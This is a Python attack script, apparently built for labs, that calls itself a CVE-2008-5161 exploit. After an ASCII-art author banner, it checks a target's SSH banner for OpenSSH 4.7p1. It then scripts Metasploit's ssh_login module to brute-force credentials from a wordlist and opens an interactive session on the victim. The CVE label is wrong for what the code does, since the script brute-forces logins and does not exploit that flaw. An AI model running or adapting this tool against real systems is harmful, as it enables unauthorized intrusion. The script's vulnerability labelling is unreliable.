from random import random

from pwn import *
from time import sleep
import json
import os

print("\n\n\nCreator : ")

Author = [

    """                                   

  ,----..       ,---,.     ,---, 
 /   /   \    ,'  .'  \ ,`--.' | 
|   :     : ,---.' .' | |   :  : 
.   |  ;. / |   |  |: | :   |  ' 
.   ; /--`  :   :  :  / |   :  | 
;   | ;     :   |    ;  '   '  ; 
|   : |     |   :     \ |   |  | 
.   | '___  |   |   . | '   :  ; 
'   ; : .'| '   :  '; | |   |  ' 
'   | '/  : |   |  | ;  '   :  | 
|   :    /  |   :   /   ;   |.'  
 \   \ .'   |   | ,'    '---'    
  `---`     `----'               


    """,

    """
          _____                    _____                    _____          
         /\    \                  /\    \                  /\    \         
        /::\    \                /::\    \                /::\    \        
       /::::\    \              /::::\    \               \:::\    \       
      /::::::\    \            /::::::\    \               \:::\    \      
     /:::/\:::\    \          /:::/\:::\    \               \:::\    \     
    /:::/  \:::\    \        /:::/__\:::\    \               \:::\    \    
   /:::/    \:::\    \      /::::\   \:::\    \              /::::\    \   
  /:::/    / \:::\    \    /::::::\   \:::\    \    ____    /::::::\    \  
 /:::/    /   \:::\    \  /:::/\:::\   \:::\ ___\  /\   \  /:::/\:::\    \ 
/:::/____/     \:::\____\/:::/__\:::\   \:::|    |/::\   \/:::/  \:::\____\
\:::\    \      \::/    /\:::\   \:::\  /:::|____|\:::\  /:::/    \::/    /
 \:::\    \      \/____/  \:::\   \:::\/:::/    /  \:::\/:::/    / \/____/ 
  \:::\    \               \:::\   \::::::/    /    \::::::/    /          
   \:::\    \               \:::\   \::::/    /      \::::/____/           
    \:::\    \               \:::\  /:::/    /        \:::\    \           
     \:::\    \               \:::\/:::/    /          \:::\    \          
      \:::\    \               \::::::/    /            \:::\    \         
       \:::\____\               \::::/    /              \:::\____\        
        \::/    /                \::/____/                \::/    /        
         \/____/                  ~~                       \/____/      
    """,

    """
  /$$$$$$  /$$$$$$$  /$$$$$$
 /$$__  $$| $$__  $$|_  $$_/
| $$  \__/| $$  \ $$  | $$  
| $$      | $$$$$$$   | $$  
| $$      | $$__  $$  | $$  
| $$    $$| $$  \ $$  | $$  
|  $$$$$$/| $$$$$$$/ /$$$$$$
 \______/ |_______/ |______/


    """,

    """
   _____   ____    _____ 
  / ____| |  _ \  |_   _|
 | |      | |_) |   | |  
 | |      |  _ <    | |  
 | |____  | |_) |  _| |_ 
  \_____| |____/  |_____|


    """,

    """
  *        )              (                   
 (  `    ( /(  (     (     )\ )                
)\))(   )\()) )\ )  )\ ) (()/(   (       (    
((_)()\ ((_)\ (()/( (()/(  /(_)) ))\  (   )\   
 (_()((_)  ((_) /(_)) /(_))(_))  /((_) )\ ((_)  
   _,.----.                    .=-.-. 
 .' .' -   \      _..---.     /==/_ / 
/==/  ,  ,-'    .' .'.-. \   |==|, |  
|==|-   |  .   /==/- '=' /   |==|  |  
|==|_   `-' \  |==|-,   '    |==|- |  
|==|   _  , |  |==|  .=. \   |==| ,|  
\==\.       /  /==/- '=' ,|  |==|- |  
 `-.`.___.-'  |==|   -   /   /==/. /  
              `-._`.___,'    `--`-`  

    """,

    """
 ░▒▓██████▓▒░  ░▒▓███████▓▒░  ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓███████▓▒░  ░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓███████▓▒░  ░▒▓█▓▒░ 




    """,

    """
 .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. |
| |     ______   | || |   ______     | || |     _____    | |
| |   .' ___  |  | || |  |_   _ \    | || |    |_   _|   | |
| |  / .'   \_|  | || |    | |_) |   | || |      | |     | |
| |  | |         | || |    |  __'.   | || |      | |     | |
| |  \ `.___.'\  | || |   _| |__) |  | || |     _| |_    | |
| |   `._____.'  | || |  |_______/   | || |    |_____|   | |
| |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------' 

    """
]

random_author_set = random.choice(Author)
print(random_author_set)

print("~ CVE-2008-5161 Exploit ~\n\n")

target_ip = input("Enter Target IP:  ").strip()


class ExploitSSH:
    def __init__(self, ip, port=22):
        self.ip = ip
        self.port = port
        self.p = log.progress("")

    def MsfExploit(self):
        results = {}
        try:
            self.p.status("Checking Version...")
            io = remote(self.ip, self.port)
            version = (io.recvuntil(
                b"SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1")).decode()
            if "OpenSSH_4.7p1" not in version:
                self.p.failure("Version OpenSSH_4.7p1 Not Found!!!")
                results['status'] = "Failure"
                results['reason'] = "Version OpenSSH_4.7p1 Not Found"
            else:
                self.p.status("Version Found")
                sleep(3)  # Wait for 2 seconds
                self.p.status("Running MSFConsole...")
                msf = process(["msfconsole", "-q"], stdin=PTY)
                msf.recvuntil(b">")
                msf.sendline(b"use auxiliary/scanner/ssh/ssh_login")
                msf.sendline(b"set rhosts " + self.ip.encode())
                msf.sendline(
                    b"set userpass_file /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
                msf.sendline(b"set stop_on_success true")
                msf.sendline(b"set threads 12")
                msf.sendline(b"set verbose true")
                msf.sendline(b"exploit")
                msf.recvuntil(b">")
                msf.sendline("show sessions")
                msf.sendline("sessions -i 1")
                msf.interactive()

                output = []
                while True:
                    line = msf.recvline()
                    if not line:
                        break
                    log.info(line.decode())
                    output.append(line.decode().strip())

                msf.close()
                results['status'] = "Success"
                results['output'] = output
        except Exception as e:
            self.p.failure(f"Error: {e}")
            results['status'] = "Failure"
            results['error'] = str(e)

        self.save_results(results)

    def save_results(self, results):
        if not os.path.exists('report'):
            os.makedirs('report')

        file_path = 'report/exploit.json'
        try:
            with open(file_path, 'a') as file:
                file.write(json.dumps(results) + "\n")
        except Exception as e:
            self.p.failure(f"Error saving results: {e}")


exploit = ExploitSSH(target_ip)
exploit.MsfExploit()